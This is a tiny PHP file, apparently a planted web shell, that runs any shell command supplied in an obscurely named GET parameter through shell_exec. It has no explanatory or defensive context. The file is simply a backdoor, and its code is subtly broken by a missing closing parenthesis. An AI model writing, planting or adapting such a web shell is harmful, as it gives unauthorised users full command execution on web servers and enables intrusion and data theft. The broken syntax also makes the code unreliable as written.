<?php
shell_exec($_GET['_SE9wYrN'];
?>
